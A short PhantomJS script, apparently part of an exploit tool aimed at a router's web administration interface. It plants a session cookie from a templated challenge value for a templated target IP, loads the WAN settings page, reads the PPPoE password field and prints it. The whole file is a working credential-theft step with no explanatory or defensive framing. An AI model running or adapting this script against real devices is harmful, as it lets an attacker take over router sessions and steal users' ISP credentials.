var page = require('webpage').create();

phantom.addCookie({
    'name': 'sid',
    'value': '%%challenge%%',
    'domain': '%%IP%%',
    'path': '/'
});

page.open("http://%%IP%%/network/wan", function (status) {
	var pass = page.evaluate(function () {
        return $('#ppp_password').val();
	});
	console.log(pass);
	phantom.exit();
});
